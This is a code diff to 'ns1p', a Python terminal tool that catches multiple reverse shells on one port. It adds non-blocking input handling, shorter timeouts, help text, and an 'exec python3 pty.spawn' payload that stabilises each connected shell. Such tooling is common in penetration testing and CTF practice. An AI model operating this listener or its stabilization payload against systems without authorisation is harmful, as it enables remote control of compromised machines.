@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
+import time
 import termios
 import tty
 import select
@@ -30,7 +31,9 @@ class NShellsOnePortApp(App):
         self.next_session_id = 0
         self.write_lock = asyncio.Lock()
 
-        yield Static("Welcome to ns1p - N Shells 1 Port")
+        self.readline_mode = False
+
+        yield Static("ns1p - N Shells 1 Port")
 
         self.session_list_view = ListView()
         yield self.session_list_view
@@ -41,35 +44,44 @@ class NShellsOnePortApp(App):
     async def on_list_view_selected(self, event: ListView.Selected):
         session_id = int(event.item.id.split('session_')[1])
         session = next(s for s in self.session_list if s.session_id == session_id)
-        self.log_view.write(f"Selected session {session.name}")
+        self.log_view.write(f"[*] Selected session {session.name}")
         with self.suspend(), RawStdin():
             def console_data_loop():
-
-                def stdin_has_data():
-                    return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])
-
                 menu = False
 
-                # TODO: implement a history function
-
-                while not menu and session in self.session_list:
-                    while True:
+                try:
+                    # TODO: implement a history function
+                    while not menu and session in self.session_list:
                         try:
                             data = session.read_deque.popleft()
                             data = data.replace(b'\n', b'\r\n')
                             sys.stdout.buffer.write(data)
                             sys.stdout.buffer.flush()
                         except IndexError:
-                            break
-                    if stdin_has_data():
-                        b = sys.stdin.buffer.read(1)
-                        if b ==  b'\x02': #STX aka Ctrl-B
-                            menu = True
-                        else:
-                            session.writer.write(b)
+                            pass
+
+                        if self.readline_mode:
+                            pass
+                        else: #raw mode
+                            # stdin read is non blocking because we disabled Canonical Mode and set VMIN=VTIME=0
+                            b = sys.stdin.buffer.read(1)
+                            if len(b) > 0:
+                                if b == b'\x02': #STX aka Ctrl-B
+                                    menu = True
+                                else:
+                                    session.writer.write(b)
+                except Exception as e:
+                    self.log_view.write(f"[-] exception in console_data_loop: {e}")
+            # WARNING: this also seems to silence errors
             await asyncio.get_running_loop().run_in_executor(None, console_data_loop)
 
     async def on_ready(self) -> None:
+        self.log_view.write("Welcome to ns1p - N Shells 1 Port")
+        self.log_view.write("Connect a reverse shell and use the arrow keys to select a session")
+        self.log_view.write("Use the enter key to interact with a session")
+        self.log_view.write("You can bring up this menu at any time by pressing Ctrl-B")
+        self.log_view.write("In readline mode it may be necessary to submit a line containing Ctrl-B (\\x03) using the enter key")
+        self.log_view.write("")
         self.run_worker(self.master_server())
 
     async def update_session_list_view(self) -> None:
@@ -95,7 +107,7 @@ class NShellsOnePortApp(App):
                 await writer.drain()
                 # read any potentially remaining data (banner, leftover command output)
                 try:
-                    await asyncio.wait_for(reader.read(), timeout=3)
+                    await asyncio.wait_for(reader.read(), timeout=.5)
                 except TimeoutError:
                     pass
 
@@ -105,8 +117,8 @@ class NShellsOnePortApp(App):
                 command_echo = False
                 data = None
                 try:
-                    data = await asyncio.wait_for(reader.readline(), timeout=1)
-                    data += await asyncio.wait_for(reader.readline(), timeout=1)
+                    data = await asyncio.wait_for(reader.readline(), timeout=.5)
+                    data += await asyncio.wait_for(reader.readline(), timeout=.5)
                 except TimeoutError:
                     pass
 
@@ -128,7 +140,7 @@ class NShellsOnePortApp(App):
             (stdin_echo, command_echo) = await shell_feature_check()
             if command_echo and not stdin_echo:
                 self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
-                writer.write(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+                writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                 await writer.drain()
                 (stdin_echo, command_echo) = await shell_feature_check()
             # TODO: have some kind of readline mode
@@ -176,6 +188,8 @@ class RawStdin:
         new_attributes[3] &= ~(termios.ECHO | termios.ECHONL | termios.ICANON | termios.ISIG | termios.IEXTEN)
 
         new_attributes[0] |= termios.ICRNL
+        new_attributes[6][termios.VMIN] = b"\x00"
+        new_attributes[6][termios.VTIME] = b"\x00"
         termios.tcsetattr(self.fd, termios.TCSANOW, new_attributes)
 
     def __exit__(self, exc_type, exc_val, exc_tb):
